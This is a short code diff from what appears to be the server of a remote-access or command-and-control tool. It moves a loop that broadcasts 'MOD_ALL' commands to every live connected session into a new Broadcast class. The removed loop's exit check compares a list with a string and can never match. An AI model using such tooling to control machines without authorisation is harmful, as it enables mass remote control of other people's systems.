@@ -16,6 +16,7 @@ from .management import CheckConn
 from .other import printColor
 from .other import XOREncryption
 from .sql import Sql
+from .broadcast import Broadcast
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT
 
 import time
@@ -96,22 +97,9 @@ class Menu:
         #Add to the start of the "MOD_ALL" command to tell the client to switch to MOD_ALL
         
         if len(Handler.dict_conn) != 0:
-            printColor("information","[?] In MOD_BROADCAST")
-            printColor("help","[?] Execute -b or --back to return to sessions mode.\n") 
-            while True:
-                forall = str(input("broadcast>")).split()
-                
-                if(forall == "--back" or forall == "-b"):
-                    break
-                for key in Handler.dict_conn.keys():
-                    if(Handler.dict_conn[key][NB_ALIVE]):
-                        if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], "MOD_ALL:"+forall):
-                            printColor("information","[+] command sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
-                        else:
-                            printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
-                    else:
-                        pass
-                print("\n")
+            
+            Broadcast().main()
+
         else:
             printColor("error","[+] No connection is enabled.\n")
         
